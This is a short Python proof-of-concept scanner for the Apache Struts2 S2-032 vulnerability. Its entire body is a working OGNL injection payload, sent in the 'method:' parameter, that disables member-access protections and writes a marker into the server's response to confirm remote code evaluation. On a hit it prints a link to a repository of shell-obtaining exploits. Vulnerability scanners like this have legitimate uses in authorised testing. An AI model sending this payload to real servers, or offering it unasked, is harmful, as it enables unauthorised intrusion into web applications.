#!/usr/bin/python3
#-*- coding:utf-8 -*-

import requests

TM = 10


def poc(url, timeout=10):
    poc='032'
    payload = {'method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#parameters.poc[0]),#writer.flush(),#writer.close': '', 'poc': poc}
    try:
        r = requests.get(url, params=payload, timeout=timeout)
    except Exception as e:
        print ("[-] Target "+url+" Not Struts2-032 Vuln!!! Good Luck\n")
        return False, f'Struts2 S2-032: 扫描失败 - {str(e)}'

    if poc in r.text:
        print("[+] Target "+url+" Find Struts2-032 Vuln!!! \n[+] GetShell:https://github.com/zhzyker/exphub/tree/master/struts2\n")
        return True, 'Struts2 S2-032: 存在漏洞'
    else:
        print("[-] Target "+url+" Not Struts2-032 Vuln!!! Good Luck\n")
        return False, 'Struts2 S2-032: 安全'


if __name__=='__main__':
    import datetime

    start = datetime.datetime.now()
    url = "http://127.0.0.1:8080"
    poc(url)
    end = datetime.datetime.now()
    print(end - start)